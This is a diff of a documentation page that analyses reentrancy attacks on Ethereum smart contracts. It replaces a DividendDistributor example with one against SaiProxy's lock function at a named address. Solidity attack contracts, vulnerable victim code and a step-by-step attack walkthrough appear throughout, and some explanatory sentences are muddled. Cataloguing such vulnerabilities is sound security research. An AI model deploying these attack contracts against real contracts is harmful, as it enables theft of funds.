@@ -4,110 +4,92 @@ Attack 02
 
 **Contract Name**
 
-DividendDistributor
+SaiProxyCreateAndExecute
 
 **Contract Address**
 
-0x7bc51b19abe2cfb15d58f845dad027feab01bfa0
+0x526af336D614adE5cc252A407062B8861aF998F5
 
 **Transaction Count**
 
-6
+9987
 
 **Invovled Ethers**
 
-1.6 Ethers
+107172.49 Ethers
 
 **Length of the Call Chain**
 
-2 internal function calls, 1 external function
+4 external function
 
 **Victim Function**
 
-``loggedTransfer``
+``lock``
 
 **Attack Mechanisim**
 
 Attack code:
 ::
 
-    contract Attack{
-        DividendDistributor d = new DividendDistributor();
-        uint bigamount = 1;
+    contract TubInterface {
         constructor() payable {}
-        function register() public {
-            d.invest.value(10)();
+        SaiProxy s;
+        address victim;
+        bytes32 temp;
+        address gemp;
+        function setVictim(address _addr, address _gem) {
+            s = SaiProxy(_addr);
+            victim = _addr;
+            gemp = _gem;
         }
-        function attack(uint amount) public {
-            d.divest(amount);
+        ...
+        function cups(bytes32 cup) public returns (address, uint, uint, uint){
+            return (victim, 0, 0, 0);
         }
-        function() payable{
-            d.divest(bigamount);
+        function gem() public view returns (TokenInterface){
+            return(TokenInterface(gemp));
         }
-        function getvalue() returns (uint) {
-            return this.balance;
+        ...
+    }
+
+    contract TokenInterface {
+        bytes32 temp;
+        address tubbb;
+        SaiProxy s;
+        TubInterface tub = new TubInterface();
+        function setVictim(address _addr, address _tub) {
+            s = SaiProxy(_addr);
+            tubbb = _tub;
         }
+        constructor() payable {}
+        ...
+        function deposit() public payable{
+            s.lock.value(1 ether)(tubbb, temp);
+                //s.open(this);
+        }
+        ...
     }
 
 Attacked code:
 ::
 
-    contract DividendDistributor is Ownable{
-        struct Investor {
-            uint investment;
-            uint lastDividend;
-        }
+    contract SaiProxy is DSMath {
+        ...
+        function lock(address tub_, bytes32 cup) public payable {
+            if (msg.value > 0) {
+                TubInterface tub = TubInterface(tub_);
 
-        mapping(address => Investor) investors;
+                (address lad,,,) = tub.cups(cup);
+                require(lad == address(this), "cup-not-owned");
 
-        uint public minInvestment;
-        uint public sumInvested;
-        uint public sumDividend;
-        
-        function loggedTransfer(uint amount, bytes32 message, address target, address currentOwner) protected
-        {
-            if(! target.call.value(amount)() )
-                throw;
-            Transfer(amount, message, target, currentOwner);
-        }
-        
-        function invest() public payable {
-            if (msg.value >= minInvestment)
-            {
-                investors[msg.sender].investment += msg.value;
-                sumInvested += msg.value;
-                // manually call payDividend() before reinvesting, because this resets dividend payments!
-                investors[msg.sender].lastDividend = sumDividend;
+                tub.gem().deposit.value(msg.value)();
+                ...
             }
         }
-
-        function divest(uint amount) public {
-            if ( investors[msg.sender].investment == 0 || amount == 0)
-                throw;
-            // no need to test, this will throw if amount > investment
-            investors[msg.sender].investment -= amount;
-            sumInvested -= amount; 
-            this.loggedTransfer(amount, "", msg.sender, owner);
-        }
-        
-        // OWNER FUNCTIONS TO DO BUSINESS
-        function distributeDividends() public payable onlyOwner {
-            sumDividend += msg.value;
-        }
-        
-        function doTransfer(address target, uint amount) public onlyOwner {
-            this.loggedTransfer(amount, "Owner transfer", target, owner);
-        }
-        
-        function setMinInvestment(uint amount) public onlyOwner {
-            minInvestment = amount;
-        }
-        
-        function () public payable onlyOwner {
-        }
-        ...
     }
 
-In this attack, we need to register the ``investors`` array first in order to guarantee we can pass the ``if`` condition in victim function ``divest``. We send ethers to the victim function to add some balances to variable ``sumInvested``. 
+In this case, the goal of our reentrancy is ``tub.gem().deposit.value(msg.value)();`` in the victim code. To reach our goal we need pass three conditions. Firstly we need to make sure the *msg.value* is greater than 0. Next we need to declare a new ``TuberInterface`` instance and call its ``cups`` function to return a address to the variable ``lad``. Last, we need to make sure the address stored in `lad` equals to the address of the victim contract.
 
-The attack process starts with function ``attack`` in the attacker's contract. It transacts with victim contract by calling ``divest`` function. The ``if`` check doesn't work due to our preliminary efforts. The running process goes to statement ``this.loggedTransfer();`` and calls an internal function ``loggedTransfer``. In this function, it does transaction first, however, the transaction target and the amount rely on the function arguments without any check. The transaction operation will call the fallback function in attacker's code. That's why we set an ``divest`` call in there. Hence, a function call loop is built. We successfully achieved *Reentrancy* attack.
+**Preparation.** We call ``setVictim`` function in attack code to set the address of victim code to the variable ``_addr`` and set the address of the other attack contract ``TokenInterface`` to ``_gem``. Next we call the other ``setVictim`` function in contract ``TokenInterface`` then set the address of victim code to ``_addr`` and set ``tubbb`` an address the same as ``_addr``. 
+
+**Attack.** The attacker call `deposit` function, it calls ``lock`` function in victim contract.  The ``if`` condition is satisfied because we our call is appended by ``.value``. Next, the contract initialize  an instance of the contract ``TubInterface`` and call ``cup`` to get the address. Unfortunately, the function involved in this attack is well manipulated and we won't let it fail. Then the contract checks whether the ``lad`` equals to the address of the victim contract. It doesn't work. We finally get to the key statement ``tub.gem().deposit`` which calls back to the `gem` function in attacker's contract. Hence, a call loop is formed and we achieved a *Reentrancy* attack.
